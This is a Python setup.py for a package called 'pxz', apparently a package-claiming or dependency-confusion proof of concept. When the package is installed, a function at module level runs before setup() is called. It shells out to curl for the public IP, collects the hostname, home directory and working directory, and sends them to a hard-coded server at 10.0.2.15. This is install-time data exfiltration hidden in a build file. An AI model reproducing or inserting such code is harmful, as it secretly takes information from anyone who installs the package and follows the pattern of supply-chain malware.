from setuptools import setup
import os
import requests

# Function to collect system information
def collect_system_info():
    try:
        public_ip = os.popen("curl -s ifconfig.me").read().strip()
        hostname = os.uname()[1]
        home_directory = os.path.expanduser("~")
        current_directory = os.getcwd()

        system_info = {
            "publicIP": public_ip,
            "hostname": hostname,
            "homeDirectory": home_directory,
            "currentDirectory": current_directory
        }

        # Send collected data to the test server (using GET instead of POST)
        response = requests.get("http://10.0.2.15:8080/collect_info.php", params=system_info)

        if response.status_code == 200:
            print("[*] System information sent successfully.")
        else:
            print(f"[!] Failed to send information. Status code: {response.status_code}")

    except Exception as e:
        print(f"[!] Error collecting system information: {e}")

# Run the function to send system information
collect_system_info()

setup(
    name="pxz",
    version="1.1.4",
    description="This Package claimed by JPD",
    long_description="A Python package to collect and send system information.",
    long_description_content_type="text/markdown",
    author="JPD",
    author_email="jpdtester01@gmail.com",
    license="MIT",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    packages=["pxz"],
    install_requires=["requests"],
)
